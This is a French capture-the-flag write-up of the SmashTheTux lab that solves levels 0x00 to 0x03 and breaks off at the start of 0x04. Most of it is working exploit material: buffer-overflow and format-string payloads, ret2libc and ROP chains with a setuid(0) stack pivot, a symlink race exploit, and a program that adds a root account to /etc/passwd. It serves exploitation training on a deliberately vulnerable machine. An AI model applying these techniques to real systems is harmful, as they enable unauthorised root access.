# Solution du CTF SmashTheTux

[SmashTheTux](https://vulnhub.com/entry/smashthetux-101,138/) est un CTF tourné vers l'exploitation de binaires et créé par le site https://canyoupwn.me/ qui, hé ! il existe encore, même si les derniers articles sur le site datent de 2019.

Mais peu importe : les exercices sont intéressants et c'est tout ce qui importe.

## Level 0x00

Aucun doute possible, on est ici dans le cas d'un buffer-oferflow tout ce qu'il y a de plus classique :

```c
// gcc pwnme.c -o pwnme -fno-stack-protector
#include <stdio.h>
#include <string.h>

void vuln( char * arg ) {
        char buf[256];
        strcpy(buf, arg);
}

int main(int argc, char **argv) {
        printf("Val: %s\n", argv[1]);
        vuln(argv[1]);

        return 0;
}
```

La pile n'est pas randomisée. C'est je pense le gros point de ce CTF sans quoi la difficulté serait bien au delà.

```shellsession
tux@tux:~/0x00$ cat /proc/sys/kernel/randomize_va_space 
0
tux@tux:~/0x00$ gdb -q ./pwnme
Reading symbols from ./pwnme...(no debugging symbols found)...done.
(gdb) r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
Starting program: /home/tux/0x00/pwnme aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad
Val: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad

Program received signal SIGSEGV, Segmentation fault.
0x63616172 in ?? ()
(gdb) info reg
eax            0xbffff450       -1073744816
ecx            0xbffff8f0       -1073743632
edx            0xbffff5e0       -1073744416
ebx            0xbffff590       -1073744496
esp            0xbffff560       0xbffff560
ebp            0x63616171       0x63616171
esi            0x0      0
edi            0x0      0
eip            0x63616172       0x63616172
eflags         0x10286  [ PF SF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/s $eax
0xbffff450:     "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...
(gdb) x/i 0x08048393
   0x8048393 <deregister_tm_clones+35>: call   *%eax
```

J'ai utilisé une chaine sans répétition de patterns de 4 caractères générée par `pwntools`.

A l'aide de ces caratères qui se retrouvent dans les registres je peux déterminer que l'adresse de retour est à l'offset 268 et que `eax` pointe sur le début du buffer.

On serait tenté d'utiliser un gadget du style `call eax` comme affiché plus haut et de placer notre shellcode au début du payload mais on serait accueilli par un beau `sigsev` car la stack est non executable (`NX`).

La solution est d'utiliser un `ret2libc` donc placer l'adresse de `system` (`0xb7e643e0`) sur la stack et plus loin un pointeur vers une chaine de caractères correspondant au programme à exécuter.

Le binaire n'affiche ici qu'un seul message, on peut se servir du `s` final pour l'exécution :

```shellsession
(gdb) x/s 0x8048530
0x8048530:      "Val: %s\n"
(gdb) x/s 0x8048536
0x8048536:      "s\n"
```

```shellsession
tux@tux:~/0x00$ cp /bin/dash s
tux@tux:~/0x00$ export PATH=.:$PATH
tux@tux:~/0x00$ ./pwnme `python -c 'print "A" * 268 + "\xe0\x43\xe6\xb7AAAA\x36\x85\x04\x08"'`
Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�C��AAAA6�
# id
uid=1000(tux) gid=1000(tux) euid=0(root) groups=1000(tux),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

On voit bien que l'on dispose du effective UID à 0. NB: Les binaires sur ce CTF ne sont pas setuid root, j'ai modifié les droits pour que le résultat soit plus visible.

## Level 0x01

```c
// gcc pwnme.c -o pwnme -fno-stack-protector
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
        char text[1024];
        scanf("%1024s", text);
        printf(text);

        exit(0);
}
```

```shellsession
tux@tux:~/0x01$ ./pwnme
AAAA%4$08x
AAAA41414141
```

Hé oui, ici il s'agit de l'exploitation de format string. On est vraiment sur la base car il n'y a aucune donnée affichée avant la chaine de format en question.

```shellsession
tux@tux:~/0x01$ gdb -q ./pwnme
Reading symbols from ./pwnme...(no debugging symbols found)...done.
(gdb) p exit
$1 = {<text variable, no debug info>} 0x8048350 <exit@plt>
(gdb) x/i 0x8048350
   0x8048350 <exit@plt>:        jmp    *0x8049754
```

Notre objectif va être d'exploiter cette format string pour écraser l'adresse d'`exit` (appelé en fin d'exécution) dans la GOT par un `pop-ret` pour faire dévier l'exécution vers notre ROP chain.

Les différentes instructions `pop` vont servir à faire le ménage sur la stack afin que l'adresse de retour qui nous intéresse soit au sommet de la pile.

Avec ROPgadget je trouve différents gadgets utiles :

```
0x0804852f : pop ebp ; ret
0x0804852c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048315 : pop ebx ; ret
0x0804852e : pop edi ; pop ebp ; ret
0x0804852d : pop esi ; pop edi ; pop ebp ; ret
```

Il faut prévoir de la place pour notre ROP chain, je prévois un certain nombre de caractères puis je retrouve l'offset auquel les données se réfléchissent (ici en position 14) :

```shellsession
tux@tux:~/0x01$ ./pwnme
1111222233334444555566667777888899990000AAAA%14$08x
1111222233334444555566667777888899990000AAAA41414141
```

Ecraser l'adresse de `exit` dans la GOT via la format strinsg est une chose mais faire en sorte que le premier gadget saute vers nos données sur la stack en est une autre.

A l'exécution je me rend compte que ça va être difficile de sauter où il faut car il y a un paquet de données à ignorer avant de parvenir au bon endroit.

J'ai trouvé ce gadget qui va remonter dans la stack de 44 octets. L'instruction `ret` finale permettra alors de sauter vers un autre gadget de notre choix :

```
0x08048529 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
```

L'adresse de `exit` dans la GOT a déjà les 2 octets de poids fort à `0x0804` par conséquent il nous reste à écrire la partie `0x8529` (octets de poids faible de l'adresse du gadget).

`0x8529` équivaut 34089 en décimal. Il faut retrancher les 44 octets qui précèdent la chaine de format donc `34089 - 44 = 34045` octets à écrire (via le format `%x`)

Je peut générer un fichier qui servira d'input au programme vulnérable :

```shellsession
$ python2 -c 'print "1111222233334444555566667777888899990000\x54\x97\x04\x08%34045x%14$hn"' > input
```

Et je peux ensuite déboguer le programme pour placer un breakpoint sur le gadget ce qui me permettra d'observer la stack et les registres à ce moment et déterminer vers quoi m'orienter.

Je peux faire un simple `ret2libc` en plaçant sur la stack l'adresse de `system()` et l'adresse de la chaine `/bin/sh` trouvée en mémoire dans la libc (rappel : l'ASLR n'est pas actif)

```shellsession
(gdb) info proc map
process 2085
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/tux/0x01/pwnme
         0x8049000  0x804a000     0x1000        0x0 /home/tux/0x01/pwnme
        0xb7e25000 0xb7e26000     0x1000        0x0 
        0xb7e26000 0xb7fcd000   0x1a7000        0x0 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so
        0xb7fcd000 0xb7fcf000     0x2000   0x1a7000 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so
        0xb7fcf000 0xb7fd0000     0x1000   0x1a9000 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so
        0xb7fd0000 0xb7fd3000     0x3000        0x0 
        0xb7fd8000 0xb7fdc000     0x4000        0x0 
        0xb7fdc000 0xb7fdd000     0x1000        0x0 [vdso]
        0xb7fdd000 0xb7fdf000     0x2000        0x0 [vvar]
        0xb7fdf000 0xb7ffe000    0x1f000        0x0 /lib/i386-linux-gnu/ld-2.19.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.19.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.19.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find /b 0xb7e26000, 0xb7fcd000, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68
0xb7f85a69
1 pattern found.
(gdb) x/s 0xb7f85a69
0xb7f85a69:     "/bin/sh"
```

Ca nous donne l'exploit suivant :

```shellsession
$ python2 -c 'print "111122223333444455556666\xe0\x43\xe6\xb78888\x69\x5a\xf8\xb70000\x54\x97\x04\x08%34045x%14$hn"' > input
---------------------------------------------^^^^^^^^^^^^^^^^----^^^^^^^^^^^^^^^^----^^^^^^^^^^^^^^^^-----^^^------
                                             adresse de system      adresse de         adresse de      écriture
                                             prise via pop*-ret       /bin/sh              exit    de l'adresse pop*-ret
```

Malheureusement le shell que l'on obtient n'est pas `setuid` root, potentiellement bash a dropppé l'effective UID. Il faut dire que notre ROP-chain n'appelle pas la fonction `setuid`.

Plutôt que d'appeller des appels à bash successifs on peut faire en sorte que le programme vulnérable appelle un exécutable à nous qui fera une opération différente comme ajouter un compte dans le fichier `/etc/passwd`.

Je récupère une chaine de caractères dans la mémoire du programme ainsi que l'adresse réelle de `exit` qui sera plus propre pour fermer la ROP-chain :

```
(gdb) x/s 0xb7f859f3
0xb7f859f3:     "densize"
(gdb) p exit
$1 = {<text variable, no debug info>} 0xb7e571b0 <__GI_exit>
```

On aura l'exploit suivant :

```shellsession
$ python2 -c 'print "111122223333444455556666\xe0\x43\xe6\xb7\xb0\x71\xe5\xb7\xf3\x59\xf8\xb7\xf3\x59\xf8\xb7\x54\x97\x04\x08%34045x%14$hn"' > input
                                               ^^^^^^^^^^^^^    ^^^^^^^^^^^^    ^^^^^^^^^^^^    ^^^^^^^^^^^^    ^^^^^^^^^^^^
                                                system()           exit()         "densize"      arg de exit      exit@got (adresse à écraser)
```

Et l'ensemble de l'exécution :

```shellsession
tux@tux:~/0x01$ cat newpassword.c 
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

int main(void) {
  FILE * fd;
  fd = fopen("/etc/passwd", "a");
  fputs("devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh\n", fd);
  fclose(fd);
}
tux@tux:~/0x01$ gcc -o densize newpassword.c 
tux@tux:~/0x01$ export PATH=.:$PATH
tux@tux:~/0x01$ python2 -c 'print "111122223333444455556666\xe0\x43\xe6\xb7\xb0\x71\xe5\xb7\xf3\x59\xf8\xb7\xf3\x59\xf8\xb7\x54\x97\x04\x08%34045x%14$hn"' > input
tux@tux:~/0x01$ ./pwnme < input
```

On retrouve notre ligne en fin de `/etc/passwd` :

```shellsession
tux@tux:~/0x01$ tail -1 /etc/passwd
devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh
tux@tux:~/0x01$ su devloop
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Level 0x02

Ici pas de débordement de buffer, l'objectif est de rentrer dans le premier block `if` qui nous permettra de lire le contenu du fichier `.readthis` de l'utilisateur `root` :

```c
// gcc pwnme.c -o pwnme
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#define UID 1000
#define GID 1000

int main (int argc, char **argv)
{
        FILE *fp;
        struct stat st;
        char content[255];

        stat(argv[1], &st);

//      printf("%d %d\n", st.st_uid, st.st_gid);
        if ( ((st.st_uid ^ UID) & (st.st_gid ^ GID)) == 0) {
                puts("Access Granted.");

                fp = fopen(argv[1], "r");
                fgets(content, 255, (FILE*)fp);
                fclose(fp);

                printf("%s\n", content);

        } else {
                puts("Access Denied.");
                exit(-1);
        }

        return 0;
}
```

C'est un cas de race condition qui rappelle le [level 10 de Nebula](https://github.com/devl00p/blog/blob/ee15216458f1cf21584daec824d2fbf6ad92e97e/ctf_writeups/Solution%20du%20CTF%20Nebula%20(levels%200%20%C3%A0%2011).md#level-10) sauf qu'ici il y a très peu de marge de manoeuvre entre le test et la lecture (alors qu'une connexion TCP était établie sur le `Nebula`).

Le binaire (qui est setuid `root`) vérifie que le fichier appartient à l'utilisateur `tux` du système (uid 1000) et si c'est le cas il affiche son contenu. Nous, nous souhaitons bien sûr profiter du bit setuid pour afficher le contenu d'un fichier appartenant à root.

A noter que la fonction `stat()` résoud corretement les liens symboliques donc un lien symbolique sur `/etc/passwd` retournera un UID de 0.

J'ai d'abord repris le code du précédent CTF :

```python
import os

while True:
        try:
                os.unlink("/tmp/readable")
        except Exception:
                pass

        fd = open("/tmp/readable", "a")
        fd.close()

        try:
                os.unlink("/tmp/readable")
        except Exception:
                pass

        os.symlink("/home/tux/0x02/.readthis", "/tmp/readable")
```

Mais ça ne donnait rien de bon, on obtenait parfois des données invalides dues à un comportement indéfini (quand le lien symbolique a été supprimé entre temps) :

```shellsession
tux@tux:~/0x02$ python race.py &
[1] 16980
tux@tux:~/0x02$ ./pwnme /tmp/readable
Access Denied.
tux@tux:~/0x02$ ./pwnme /tmp/readable
Access Granted.
M���B���
```

J'ai essayé de réécrire le code en C en effectuant de multiples essais et en augmentant graduellement la temporisation entre les changements du lien symolique :

```c
#include <unistd.h>
#include <stdio.h>

#define PATH "/tmp/readable"
#define TARGET "/home/tux/0x02/.readthis"

int main(int argc, char *argv[]) {
        unsigned int delay = 1;

        while (1) {
                unsigned int tries = 0;

                for (tries=0; tries<1000000; tries++) {
                        unlink(PATH);
                        symlink("/home/tux/0x02/hint", PATH);
                        usleep(delay);

                        unlink(PATH);
                        symlink(TARGET, PATH);
                        usleep(delay);
                }
                delay++;
                printf("%u\n", delay);
        }
        return 0;
}
```

Mais ça ne fonctionnait pas mieux. Un coup de `strace` sur un appel à la commande `ln` prouvait que si le fichier existe déjà le programme passe nécessairement par `unlink` (suppression) avant de créer un nouveau lien symbolique.

Bref, nous ne sommes pas assez rapides. Un blog indiquait que la seule solution est d'avoir recours à un renommage qui permet une opération atomique :

[How to change symlinks atomically - Tom Moertel’s Blog](https://blog.moertel.com/posts/2005-08-22-how-to-change-symlinks-atomically.html)

E lisant la manpage de `rename` on rouve une option `RENAME_EXCHANGE` qui fonctionne de manière atomique : deux fichiers peuvent être ainsi permuttés sans passer par un état temporaire.

J'ai eu un peu de mal à utiliser la fonction `renameat2` qui ne peut visiblement pas s'employer telle quelle mais fonctionne via la fonction `syscall()` :

```c
#define _GNU_SOURCE
#include <linux/fs.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/syscall.h>

int main(void) {
        while (1) {
                syscall(SYS_renameat2, AT_FDCWD, "tuxowned", AT_FDCWD, "rootowned", RENAME_EXCHANGE);
        }
        return 0;
}
```

Il faut d'abord créer les deux liens symboliques qui seront permutés :

```shellsession
tux@tux:~/0x02$ ln -s .readthis rootowned
tux@tux:~/0x02$ ln -s hint tuxowned
```

On lance le programme d'exploitation en tache de fond et on boucle sur le programme vulnérable jusqu'à la réussite (qui vient assez vite) :

```shellsession
tux@tux:~/0x02$ while true; do ./pwnme tuxowned ; done | grep -v Denied | grep -v Granted | grep -v Sorry | egrep -ve '^$'
You've Successfully exploited Race Condition!
```

## Level 0x03

On dispose du code source suivant :

```c
// gcc -mpreferred-stack-boundary=2 -fno-stack-protector pwnme.c -o pwnme
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int mystrcpy(const char * text) {
        char buff[512];

        if(strlen(text) > 512){
                puts("Nice Try.");
                exit(-1);
        } else {
                strcpy(buff, text);
        }

        return 0;

}


int main(int argc, char **argv) {

        mystrcpy(argv[1]);

        return 0;
}
```

L'exécutable est dans les même dispositions que les précédents :

```shellsession
$ checksec --file pwnme
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwnme
```

Si on passe 512 octets au binaire c'est suffisant pour le faire crasher :

```
tux@tux:~/0x03$ gdb -q ./pwnme 
Reading symbols from ./pwnme...(no debugging symbols found)...done.
(gdb) r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf
Starting program: /home/tux/0x03/pwnme aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf

Program received signal SIGSEGV, Segmentation fault.
0x66616162 in ?? ()
(gdb) info reg
eax            0x0      0
ecx            0xbffff8f0       -1073743632
edx            0xbffff50c       -1073744628
ebx            0xb7fcf000       -1208160256
esp            0xbffff508       0xbffff508
ebp            0x6661617a       0x6661617a
esi            0x0      0
edi            0x0      0
eip            0x66616162       0x66616162
eflags         0x10286  [ PF SF IF RF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/s $ecx
0xbffff8f0:     ""
(gdb) x/s $edx
0xbffff50c:     ""
(gdb) x/s $ebx
0xb7fcf000:     "\250\215\032"
(gdb) x/s $esp
0xbffff508:     "caaf"
```

Grace à la chaine cyclique générée par `pwntools` on détermine que `eip` est écrasé par les 4 avant derniers octets de la chaine (`baaf`) et que `esp` pointe sur les 4 derniers.

Là encore `NX` nous oblige à utiliser une ROP-chain et un appel seul à `system` ne nous donnera pas l'effective UID souhaité.

Il faut donc être en mesure d'appeller `setuid(0)` via des gadgets tout en sachant qu'on ne peut pas placer la valeur 0 sur la stack à cause de `strcpy` qui s'arrête au premier octet nul.

L'autre difficulté majeure c'est qu'on a vu que le programme n'est pas vulnérable si on lui donne plus de 512 octets or au moment où le flux d'exécution est détourné `esp` pointe sur les derniers octets... ça nous laisse très peu de place.

Il faut par conséquent commencer par un gadget qui fera pointer `esp` dans les adresses plus basses, sur le début de notre buffer. Voici quelques exemples trouvés :

```nasm
0x08048549 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0xb7e42156 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0xb7ef5d06 : sub esp, 0x1c ; leave ; ret
0xb7e29930 : pop esp ; ret
```

Le dernier est parfait car l'ASLR étant désactivé on peut fixer `esp` à l'adresse que l'on souhaite.

Il suffit de placer l'adresse du gadget suivi de la nouvelle adresse dans notre payload pour obtenir notre stack pivot :

```shell-session
(gdb) r `python -c 'print "A"*504 + "\x30\x99\xe2\xb7\x0c\xf3\xff\xbf"'`
```

Malheureusement tout rendre relatif à l'adresse de la stack peut rendre notre exploit instable : le moindre changement sur l'environnement va décaler les adresses et l'exploit sera inopérant.

Pour résoudre cela, la technique que j'ai utilisé consiste à exécuter le binaire avec un environnement contrôlé limité à des variables d'environnement prédéfinies.

Maintenant il faut nous concentrer sur l'appel à `setuid(0)`. Les gadgets comportant un `push` sont généralement inutilisables car ils cassent la ROP-chain (bye bye l'adresse poppée par `ret`). Il faut donc trouver un gadget qui écrit explicitement quelques octets plus loin que `esp` :

```nasm
0xb7e963f0 : mov dword ptr [eax + 8], 0 ; ret
```

Parfait ! Avec ce gadget on peut écrire `0` n'importe où en mémoire du moment qu'on contrôle `eax`. Ce qui nous amène à ce second gadget :

```nasm
0xb7e6728a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

Maintenant il faut récupérer l'adresse de `setuid` (`0xb7edde50`) puis celle de `system` et `/bin/sh` :

```shellsession
(gdb) p system
$5 = {<text variable, no debug info>} 0xb7e643e0 <__libc_system>
(gdb) find /b 0xb7e26000,0xb7fcd000, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68
0xb7f85a69
1 pattern found.
(gdb) x/s 0xb7f85a69
0xb7f85a69:     "/bin/sh"
```

Après un bon moment à manier `gdb` je suis parvenu à l'exploit suivant :

```python
import os
from struct import pack

pop_esp = 0xb7e29930  # pop esp ; ret
push_0 = 0xb7e963f0   # mov dword ptr [eax + 8], 0 ; ret
pop_eax = 0xb7e6728a  # pop eax ; pop ebx ; pop esi ; pop edi ; ret

setuid = 0xb7edde50
system = 0xb7e643e0
bin_sh = 0xb7f85a69

buff_addr = 0xbffff9bc
uid_offset = 24

# On fixe l'environnement pour s'éviter des surprises
myenv = {
        "SHELL": "/bin/bash",
        "TERM": "xterm-256color",
        "USER": "root",
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "PWD": "/home/tux/0x03",
        "HOME": "/root",
}

payload = pack("<I", pop_eax)  # pop to eax and some other registers
payload += pack("<I", buff_addr + uid_offset)  # eax = addr where the arg for setuid (0) will be put
payload += "P" * 12
payload += pack("<I", push_0)  # write 0 to [eax+8] (overwrite OOOO bellow)
payload += pack("<I", setuid)
payload += pack("<I", system)
payload += "OOOO"  # will be overwritten by 0s
payload += pack("<I", bin_sh)
payload += "iminyourmemorywritingmyshellcode" * 9  # padding
payload += pack("<I", pop_esp)  # overwrite the real return addr
payload += pack("<I", buff_addr)  # set esp so the stack is the start of our buffer
payload += "A" * (512 - len(payload))
os.execve("./pwnme", ["./pwnme", payload], myenv)
```

L'exploitation se déroule comme ceci :

* l'adresse de retour est écrasée par le `pop esp, ret` qui change `esp` par la valeur qui suit et le fait pointer au début du buffer

* `pop eax ; pop ebx ; pop esi ; pop edi ; ret` est appelé et lit ainsi l'adresse où l'on veut placer la valeur `0`. Cette adresse est stockée dans `eax`. On place du padding pour les autres `pop`

* `mov dword ptr [eax + 8], 0 ; ret` est exécuté pour écrire `0` à l'adresse de notre choix soit 8 octets après la valeur courante de `esp` (là ou j'ai mis `OOOO` en placeholder)

* `setuid` est appelé et va chercher son argument 2 dwords plus loin donc `setuid(0)`

* `system() `est appelé et utilise là encore l'argument qui est à deux dwords plus loin donc `/bin/sh`

```shellsession
tux@tux:~/0x03$ python exploit.py 
# id
uid=0(root) gid=1000(tux) groups=1000(tux),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

## Level 0x04

On a ici un programme qui lit d'abord une taille donnée sur 2 octets puis lit le reste.

On est sur un stack overflow :

```c
// gcc -fno-stack-protector pwnme.c -o pwnme
#include <stdio.h>
#include <stdint.h>
#define MAX_LEN 1024

struct foo {
        uint16_t len;
        char content[MAX_LEN];
} foo;

int foo_cpy(FILE *fp) {
        struct foo bar;

        fread(&bar.len, sizeof(uint16_t), 1, fp);
        if ((bar.len+1 & 0xff) > MAX_LEN) {
                puts("Bad dog!");
        } else {
                puts("Good.");
                fseek(fp, 2, SEEK_SET);
                fread(&bar.content, 1, bar.len, fp);
                printf("%s\n", bar.content);
        }

        fclose(fp);

        return 0;
}

int main(int argc, char **argv) {
        FILE * fp;
        fp = fopen(argv[1], "r");
        foo_cpy(fp);
        return 0;
}
```

J'ai eu un peut de mal au début pour comprendre pourquoi `eip` n'était pas écrasé correctement :

```shellsession
tux@tux:~/0x04$ python -c 'print "!!" + "A" * 1040' > input 
tux@tux:~/0x04$ ./pwnme input
Good.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
o|"�
Segmentation fault
tux@tux:~/0x04$ dmesg | tail -1
[273533.570338] pwnme[30520]: segfault at 44 ip b7f4d706 sp bffff250 error 4 in libc-2.19.so[b7e26000+1a7000]
```

Il s'agissait en fait du retour à la ligne en fin du fichier généré qui faussait l'exploitation :

```shellsession
tux@tux:~/0x04$ python -c 'import sys;sys.stdout.write("!!" + "A" * 1040)' > input 
tux@tux:~/0x04$ ./pwnme input 
Good.
